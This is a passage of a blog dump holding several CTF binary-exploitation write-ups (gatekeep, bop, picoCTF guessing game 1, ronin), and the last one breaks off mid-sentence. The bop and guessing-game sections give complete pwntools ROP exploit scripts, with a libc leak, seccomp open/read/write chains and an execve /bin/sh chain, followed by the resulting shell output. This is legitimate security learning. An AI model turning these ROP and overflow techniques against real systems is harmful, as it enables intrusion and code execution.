style=\"color:#ae81ff\"\u003e0\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Can\u0026#39;t access /dev/urandom.\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eexit\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003essize_t\u003c/span\u003e result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eread\u003c/span\u003e(data, pass, \u003cspan style=\"color:#66d9ef\"\u003esizeof\u003c/span\u003e pass);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (result \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Data not received from /dev/urandom\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003eexit\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eclose\u003c/span\u003e(data);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Password:\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003egets\u003c/span\u003e(input);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003estrcmp\u003c/span\u003e(input, pass)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;I swore that was the right password ...\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        access \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(access) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Guess I couldn\u0026#39;t gaslight you!\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003eprint_flag\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e(){\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003esetbuf\u003c/span\u003e(stdout, NULL);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;If I gaslight you enough, you won\u0026#39;t be able to guess my password! :)\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003echeck\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ewithin \u003ccode\u003echeck()\u003c/code\u003e, the password is being stored into a buffer using \u003ccode\u003egets()\u003c/code\u003e. So\nI immediately thought that if I can control the return address of \u003ccode\u003echeck()\u003c/code\u003e\nfunction to \u003ccode\u003eprint_flag()\u003c/code\u003e, then we can get the flag. I checked the security\nproperties of this binary by running \u003ccode\u003epwn checksec --file=./gatekeep\u003c/code\u003e.\u003c/p\u003e","title":"LA CTF - pwn: gatekeep"},{"content":"PWN: bop I didn\u0026rsquo;t get to solve this by my own but there were many interesting things that I wasn\u0026rsquo;t aware of that can be used to solve this challenge. However, I wanted to talk about a few things I got to know during the struggle of working on this challenge.\nret2dlresovle References: https://syst3mfailure.io/ret2dl_resolve https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve When a binary uses the shared libraries by dynamically linking to them, they do not have (or know) all the addresses for those library functions as the program starts up. They would resolve this issue (finding the addresses of those functions) when the functions are actually called. And the trick in this technique is to force the dynamic linker to resolve (or relocate) all the addresses of the library functions as the program starts. The pwntools python library allows us to choose the functions of our choice and and use them as their addresses were already resolved.\nret2csu References: https://ir0nstone.gitbook.io/notes/types/stack/ret2csu https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf https://bananamafia.dev/post/x64-rop-redpwn/ I somehow got to know about this technique - ret2csu is to find more registers (so gadgets) when there aren\u0026rsquo;t enough gadgets to use. It is possible when a binary is dynamically linked to some code (such as glibc), __libc_csu_init() gets invoked before main(). This function is where we can gather some useful gadgets.\ncommon exploit Another aspect about this challenge is that there are only a few syscall that are allowed to be used due to the seccomp setup. And there is no syscall used in the main function so we will need to leak the address of a libc function and then find syscalls from the libc. This solution was great that it breaks down each component of their exploit so it was good for me to look at each functionality to understand how the attack was crafted. Here is my modified version of their solution with some comments for my own good.\nfrom pwn import * #p = process(\u0026#34;./bop\u0026#34;) p = remote(\u0026#34;mc.ax\u0026#34;, \u0026#34;30284\u0026#34;) #p = pwn.gdb.debug(\u0026#39;./bop\u0026#39;, #\u0026#39;\u0026#39;\u0026#39; #b *0x4012f9 #\u0026#39;\u0026#39;\u0026#39; #) offset = 40 elf = context.binary = ELF(\u0026#34;./bop\u0026#34;) libc = ELF(\u0026#34;./libc-2.31.so\u0026#34;) main_addr = 0x4012f9 empty_addr = 0x405000 - 0x100 # this is to be used later flag_size = 0x60 rop = ROP(elf) pop_rdi = 0x4013d3 ret = 0x40101a # leak libc payload = b\u0026#34;a\u0026#34; * 40 payload += p64(pop_rdi) payload += p64(elf.got[\u0026#39;printf\u0026#39;]) payload += p64(ret) payload += p64(elf.plt[\u0026#39;printf\u0026#39;]) payload += p64(ret) payload += p64(main_addr) p.sendlineafter(b\u0026#34;Do you bop?\u0026#34;, payload) p.recvuntil(b\u0026#39; \u0026#39;) # reading in 6 bytes then fill the rest of 00 # unpacks the value as little-endian integer leak = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) log.info(\u0026#34;printing leak: 0x%x\u0026#34; % leak) # this is \u0026#39;leak of printf\u0026#39; - \u0026#39;offset of printf\u0026#39; = \u0026#39;libc base addr\u0026#39; # until libc.address is set, libc.sym[] will get you the offests only libc.address = leak - libc.sym[\u0026#39;printf\u0026#39;] # make sure the address ends with 000 --- appropriate alignment log.info(\u0026#34;libc addr: 0x%x\u0026#34; %libc.address) # new ropper rl = ROP(libc) # read the flag in --- \u0026#39;flag.txt\\0\u0026#39; # read from the stdin - fd of 0 # read into the memory segment with \u0026#39;w\u0026#39; permission bit on # size of 0x10 should be enough # then call the read func --- libc.sym[\u0026#39;read\u0026#39;] ---\u0026gt; now the offsets to the # syscalls should have been resolved to the address to the read call payload = b\u0026#34;a\u0026#34; * 40 payload += p64(pop_rdi) payload += p64(0x0) payload += p64(rl.find_gadget([\u0026#39;pop rsi\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(empty_addr) payload += p64(rl.find_gadget([\u0026#39;pop rdx\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(0x10) payload += p64(libc.sym[\u0026#39;read\u0026#39;]) payload += p64(main_addr) p.sendlineafter(b\u0026#34;Do you bop?\u0026#34;,payload) # don\u0026#39;t forget to actually type \u0026#34;flag.txt\\0\u0026#34; in p.sendline(b\u0026#34;flag.txt\\0\u0026#34;) # open the flag file now payload = b\u0026#34;a\u0026#34; * 40 payload += p64(pop_rdi) payload += p64(empty_addr) # we saved \u0026#39;flag.txt\\0\u0026#39; here payload += p64(rl.find_gadget([\u0026#39;pop rsi\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(constants.O_RDONLY) # setting read only flag payload += p64(rl.find_gadget([\u0026#39;pop rax\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(constants.SYS_open) # open syscall number should be in rax # done setting up registers, call \u0026#39;syscall\u0026#39; #payload += p64(rl.find_gadget([\u0026#39;syscall\u0026#39;, \u0026#39;ret\u0026#39;])[0]) print(hex(rl.find_gadget([\u0026#39;syscall\u0026#39;, \u0026#39;ret\u0026#39;])[0])) #print(hex(libc.address + 0x0630a9)) payload += p64(libc.address + 0x0630a9) payload += p64(main_addr) p.sendlineafter(b\u0026#34;Do you bop?\u0026#34;, payload) # read the file in using the fd returned from opening the file # could not get the below idea working # getting fd into rdi 0x05b521 is mov rax ,rdi # libc.address + 0x05b521 will get that gadget # reusing the read/writable memory segment payload = b\u0026#34;a\u0026#34; * 40 payload += p64(pop_rdi) payload += p64(0x3) # assuming payload += p64(rl.find_gadget([\u0026#39;pop rsi\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(empty_addr) payload += p64(rl.find_gadget([\u0026#39;pop rdx\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(flag_size) payload += p64(rl.find_gadget([\u0026#39;pop rax\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(constants.SYS_read) payload += p64(rl.find_gadget([\u0026#39;syscall\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(main_addr) p.sendlineafter(b\u0026#34;Do you bop?\u0026#34;, payload) # write to stdout payload = b\u0026#34;a\u0026#34; * 40 payload += p64(pop_rdi) payload += p64(0x1) # we saved \u0026#39;flag.txt\\0\u0026#39; here payload += p64(rl.find_gadget([\u0026#39;pop rsi\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(empty_addr) # setting read only flag payload += p64(rl.find_gadget([\u0026#39;pop rdx\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(flag_size) payload += p64(rl.find_gadget([\u0026#39;pop rax\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(constants.SYS_write) # open syscall number should be in rax # done setting up registers, call \u0026#39;syscall\u0026#39; payload += p64(rl.find_gadget([\u0026#39;syscall\u0026#39;, \u0026#39;ret\u0026#39;])[0]) payload += p64(main_addr) p.sendlineafter(b\u0026#34;Do you bop?\u0026#34;, payload) p.interactive() Misc This challenge provided the libc file through the dockerfile. So there was not really a need of finding offsets of libc functions to find a libc version from the known database (and some people complained that using this method wasn\u0026rsquo;t really working).\nConclusion It was a fun(?) challenge and I picked up many new things. There are so many things I still don\u0026rsquo;t know! That is the beauty I guess!\n","permalink":"https://joonkim0625.github.io/posts/2023-2-06-dicectf2023-pwn-bop/","summary":"\u003ch2 id=\"pwn-bop\"\u003ePWN: bop\u003c/h2\u003e\n\u003cp\u003eI didn\u0026rsquo;t get to solve this by my own but there were many interesting things\nthat I wasn\u0026rsquo;t aware of that can be used to solve this challenge. However, I\nwanted to talk about a few things I got to know during the struggle of working\non this challenge.\u003c/p\u003e\n\u003ch3 id=\"ret2dlresovle\"\u003eret2dlresovle\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eReferences:\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://syst3mfailure.io/ret2dl_resolve\"\u003ehttps://syst3mfailure.io/ret2dl_resolve\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve\"\u003ehttps://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eWhen a binary uses the shared libraries by dynamically linking to them, they do\nnot have (or know) all the addresses for those library functions as the program starts up.\nThey would resolve this issue (finding the addresses of those functions) when\nthe functions are actually called. And the trick in this technique is to force\nthe dynamic linker to resolve (or relocate) all the addresses of the library functions as the program starts.\nThe \u003ccode\u003epwntools\u003c/code\u003e python library allows us to choose the functions of our choice\nand and use them as their addresses were already resolved.\u003c/p\u003e","title":"diceCTF 2023 - pwn: bop"},{"content":"References 1: https://mregraoncyber.com/picoctf-writeup-guessing-game-1/\n2: https://github.com/dannyc-dev/Building-the-ROP-Chain\n3: https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9\nInvestigation file ./vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped This tells us that this executable contains all the libraries so we will be able to find a lot of gadgets if we have to find some.\nChecksec result Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) PIE is disabled and NX is enabled so we won\u0026rsquo;t be able to execute anything by putting things onto the stack. We will need to do some ROP.\nDecompliation Main function unsigned int v3; // [rsp+1Ch] [rbp-4h] setvbuf(stdout, 0LL, 2LL, 0LL); v3 = getegid(); setresgid(v3, v3, v3); puts(\u0026#34;Welcome to my guessing game!\\n\u0026#34;); while ( 1 ) { while ( !(unsigned int)do_stuff() ) ; win(); } The do_stuff() seems to be the main logic of this program.\ndo_stuff() __int64 random; // rax char v2[104]; // [rsp+0h] [rbp-80h] BYREF __int64 v3; // [rsp+68h] [rbp-18h] __int64 v4; // [rsp+70h] [rbp-10h] unsigned int v5; // [rsp+7Ch] [rbp-4h] random = get_random(); v4 = increment(random); v5 = 0; puts(\u0026#34;What number would you like to guess?\u0026#34;); fgets(v2, 100LL, stdin); v3 = atol(v2); if ( v3 ) { if ( v3 == v4 ) { puts(\u0026#34;Congrats! You win! Your prize is this print statement!\\n\u0026#34;); return 1; } else { puts(\u0026#34;Nope!\\n\u0026#34;); } } else { puts(\u0026#34;That\u0026#39;s not a valid number!\u0026#34;); } return v5; win() nt64 __fastcall win(__int64 a1, int a2, int a3, int a4, int a5, int a6) { int v6; // edx int v7; // ecx int v8; // r8d int v9; // r9d char v11[112]; // [rsp+0h] [rbp-70h] BYREF printf((unsigned int)\u0026#34;New winner!\\nName? \u0026#34;, a2, a3, a4, a5, a6, v11[0]); fgets(v11, 360LL, stdin); return printf((unsigned int)\u0026#34;Congrats %s\\n\\n\u0026#34;, (unsigned int)v11, v6, v7, v8, v9, v11[0]); } get_random() does one job rand() % 100. rand() from the standard library returns a pseudo-random number (between 0 and 32767 which is the RAND_MAX value). From the reference [1], I learned that rand() generates numbers can be guessed because they are generated by having a pattern. This means that every time we run this program, it will generate the same number and we will be able to guess that number by creating a small program.\nOnce we give the program the correct guess, it will execute win() asking for the name of user. As we can see from the decompiled code, win() has a buffer that we can use to store our rop chain.\nUsing gdb-gef to find an offset to the buffer that stores the name of the user, it was 120 bytes.\nCollecting gadgets Our goal is likely to use execve() to run a shell /bin/sh. execve() needs three arguments to it: the file path to execute, argv, and envp. And the second and the third arguments can be null. I used to use rp++ to find gadgets, but ROPgadget provides useful steps to create a rop chain (rp++ might have something like this too but I have not done my research). By simply running ROPgadget --binary ./vuln --ropchain, you will get something like this:\nROP chain generation =========================================================== - Step 1 -- Write-what-where gadgets [+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret [+] Gadget found: 0x410ca3 pop rsi ; ret [+] Gadget found: 0x4163f4 pop rax ; ret [+] Gadget found: 0x445950 xor rax, rax ; ret - Step 2 -- Init syscall number gadgets [+] Gadget found: 0x445950 xor rax, rax ; ret [+] Gadget found: 0x475430 add rax, 1 ; ret [+] Gadget found: 0x475431 add eax, 1 ; ret - Step 3 -- Init syscall arguments gadgets [+] Gadget found: 0x400696 pop rdi ; ret [+] Gadget found: 0x410ca3 pop rsi ; ret [+] Gadget found: 0x44a6b5 pop rdx ; ret - Step 4 -- Syscall gadget [+] Gadget found: 0x40137c syscall Very convenient!\nto move something into rdi register (first arg to a function)\n0x00400696: pop rdi ; ret; to move something into rsi register (second arg to a function)\n0x410ca3 pop rsi ; ret; to move something into rdx register (third arg to a function)\n0x44a6b5 pop rdx ; ret; to move something into rax register (also where the syscall number goes into)\n0x4163f4 pop rax ; ret; to move something into where rsi register points to\n0x47ff91 mov qword ptr [rsi], rax ; ret to clear rax register\n0x445950 xor rax, rax ; ret; to call syscall\n0x0040137c: syscall; /bin/sh in the little endian format\n0x68732f6e69622f Use of .bss section\nFrom some research, since the executable\u0026rsquo;s PIE is enabled, we can utilize some memory segment that have READ/WRITE permissions such as .bss section. This can be checked by running the executable under GDB and checking its vmmap to see the start and the end of some memory region that have such permissions. Also, we can do readelf -S vuln to see all the section headers within the executable.\nThe address of WA segment of the memory .bss: 0x00000000006bc3a0 this is where we are going to store /bin/sh Now, we need to chain all these gadgets. Since we won\u0026rsquo;t be able to store the string onto the stack, we need to write /bin/sh into .bss section. How we are going to do is to bring the address of .bss section into rsi register since it is the file path argument for execve(). Then, we will have one of the registers hold /bin/sh string. After that, we will use this instruction 0x47ff91 mov qword ptr [rsi], rax ; ret; to assign the string value to the memory address that rsi register has. This will make sure that the address of .bss points to the start of /bin/sh (we will later bring this address into rdi).\nIt is important to realize what gadgets we are allowed to use and use them wisely to craft the chain. In this case, we have a gadget allows us to move something from rax into the memory address pointed by rsi and we have gadgets that do pop rsi, mov rax, and pop rax. So it makes sense that move the address of .bss segment into rsi, put the string value into rax by popping rax, move that rax\u0026rsquo;s value into the memory address stored in rsi, then finally move .bss address into rdi by popping rdi register (I am reiterating a lot but this is needed to make sure I understand what is going on).\nI came up with this python script:\n#!/usr/bin/env python3 from pwn import * exe = ELF(\u0026#34;./vuln\u0026#34;) context.binary = exe def conn(): if args.LOCAL: r = process([exe.path]) if args.DEBUG: gdb.attach(r) else: r = remote(\u0026#34;jupiter.challenges.picoctf.org\u0026#34;, 26735) return r def main(): r = conn() # good luck pwning :) bss_addr = p64(0x6bc3a0) syscall = p64(0x40137c) bin_sh = p64(0x68732f6e69622f) # /bin/sh in little endian pop_rdi = p64(0x400696) pop_rsi = p64(0x410ca3) pop_rdx = p64(0x44a6b5) pop_rax = p64(0x4163f4) mov_str_to_bss = p64(0x47ff91) execve_num = p64(0x3b) clear_rax = p64(0x445950) # we know that the offset to the ret address within the win() is 120 bytes payload = 120 * b\u0026#39;A\u0026#39; # we want \u0026#39;rsi\u0026#39; register to have the address to .bss seg payload += pop_rsi payload += bss_addr # we put /bin/sh string into a temp register (in our case, rax) # then we move that str value to be pointed by rsi\u0026#39;s mem address of .bss seg payload += pop_rax payload += bin_sh payload += mov_str_to_bss # clear rax by xor\u0026#39;ing then mov 59 or hex 0x3b into rax for execve() syscall payload += clear_rax # might not be necessary payload += pop_rax payload += execve_num # bring .bss address which points to the start of /bin/sh into rdi for execve() payload += pop_rdi payload += bss_addr # clear rsi and rdx (null) payload += pop_rsi payload += p64(0) payload += pop_rdx payload += p64(0) # syscall! payload += syscall # beginning of the program # 84 is the first sequence of the randomly generated numbers: rand() % 100 + 1 r.sendline(b\u0026#39;84\u0026#39;) r.sendline(payload) r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() The result:\n$ python3 solve.py 1 ⚙ [*] \u0026#39;/home/kali/ctf/picoctf2020/guessing-game-1/vuln\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to jupiter.challenges.picoctf.org on port 26735: Done b\u0026#39;first: /bin/sh\\x00\u0026#39; b\u0026#39;second: hs/nib/\u0026#39; [*] Switching to interactive mode Welcome to my guessing game! What number would you like to guess? Congrats! You win! Your prize is this print statement! New winner! Name? Congrats AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xa3\\x0c $ cat flag.txt picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b751b438dd8c4bb7}$ Nice! Thank you for reading.\n","permalink":"https://joonkim0625.github.io/posts/2022-12-27-guessing-game-1/","summary":"\u003ch2 id=\"references\"\u003eReferences\u003c/h2\u003e\n\u003cp\u003e1: \u003ca href=\"https://mregraoncyber.com/picoctf-writeup-guessing-game-1/\"\u003ehttps://mregraoncyber.com/picoctf-writeup-guessing-game-1/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e2: \u003ca href=\"https://github.com/dannyc-dev/Building-the-ROP-Chain\"\u003ehttps://github.com/dannyc-dev/Building-the-ROP-Chain\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e3: \u003ca href=\"https://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9\"\u003ehttps://cyb3rwhitesnake.medium.com/picoctf-guessing-game-1-pwn-bdc1c87016f9\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"investigation\"\u003eInvestigation\u003c/h2\u003e\n\u003ch3 id=\"file-vuln\"\u003efile ./vuln\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003evuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=94924855c14a01a7b5b38d9ed368fba31dfd4f60, not stripped\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThis tells us that this executable contains all the libraries so we will be able\nto find a lot of gadgets if we have to find some.\u003c/p\u003e\n\u003ch3 id=\"checksec-result\"\u003eChecksec result\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eArch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      No PIE (0x400000)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ePIE is disabled and NX is enabled so we won\u0026rsquo;t be able to execute anything by putting things onto the\nstack. We will need to do some ROP.\u003c/p\u003e","title":"picoCTF 2020 - pwn: guessing game 1"},{"content":"References https://git.mbund.org/mbund/buckeyectf-2022/src/branch/main/writeups/ronin/ronin.md\nDecompiled code After decompiling the binary, I was able to take a look at those major funtions that make up this program.\nmain():\nint __cdecl main(int argc, const char **argv, const char **envp) { char shellcode_buffer[80]; // [rsp+0h] [rbp-50h] BYREF setvbuf(_bss_start, 0LL, 2, 0LL); scroll(txt); fgets(shellcode_buffer, 80, stdin); if ( !strncmp(\u0026#34;Chase after it.\u0026#34;, shellcode_buffer, 15uLL) ) { scroll(off_4028); chase(); } scroll(off_4030); return 0; } scroll():\nize_t __fastcall scroll(const char *addr_to_some_buffer) { __useconds_t v1; // eax size_t result; // rax char single_char; // [rsp+1Fh] [rbp-11h] size_t v4; // [rsp+20h] [rbp-10h] size_t i; // [rsp+28h] [rbp-8h] v4 = strlen(addr_to_some_buffer); for ( i = 0LL; ; ++i ) { result = i; if ( i \u0026gt;= v4 ) break; single_char = addr_to_some_buffer[i]; // printing a single char from the string array putchar(single_char); if ( single_char == 10 ) v1 = 1000000; else v1 = 50000; usleep(v1); } return result; } encounter():\nsize_t encounter() { char s[32]; // [rsp+0h] [rbp-20h] BYREF while ( getchar() != 10 ) ; scroll(off_4040); fgets(s, 49, stdin); return scroll(off_4048); } chase():\noid __noreturn chase() { int user_input_direction; // [rsp+Ch] [rbp-24h] BYREF __int64 text_options[4]; // [rsp+10h] [rbp-20h] text_options[0] = (__int64)\u0026#34;The treeline ends, and you see beautiful mountains in the distance. No monkey here.\\n\u0026#34;; text_options[1] = (__int64)\u0026#34;Tall, thick trees surround you. You can\u0026#39;t see a thing. Best to go back.\\n\u0026#34;; text_options[2] = (__int64)\u0026#34;You found the monkey! You continue your pursuit.\\n\u0026#34;; text_options[3] = (__int64)\u0026#34;You find a clearing with a cute lake, but nothing else. Turning around.\\n\u0026#34;; scroll(off_4038); while ( 1 ) { __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;user_input_direction); if ( user_input_direction \u0026lt;= 3 ) search((const char *)text_options[user_input_direction], user_input_direction); else puts(\u0026#34;Nice try, punk\u0026#34;); } } How to? I noticed there were two possible buffers that I could store the shellcode in the main function and encounter(). But, if I want to use the buffer in encounter(), the size of the shellcode should be small (smaller than 40 bytes possibly). If we use a shellcode that is crafted by pwntools\u0026rsquo; shellcraft utility, the amd64 linux shellcode is 48 bytes big so we must use the buffer that is in the main function.\nWhat I didn\u0026rsquo;t realize was if I wanted to use the buffer in the main function (or even the buffer in encounter()), since PIE is enabled, we need to find an offset to the buffer because we don\u0026rsquo;t know the exact memory address to the buffer.\nAs I just mentioned it is important to find a spot where you can leak stack address to calculate the offset to the buffer and in chase(), there is this line of code search((const char *)text_options[user_input_direction], user_input_direction); that passes the pointer to a char array where stores some strings that need to be printed to the users. And by providing an index value that is abnormal (meaning a negative value), the reference says that we are able to leak a memory address on stack.\nIn chase(), we can see that as long as the index value that we enter is less than 4, it will pass the memory address of text_options[some_val] to 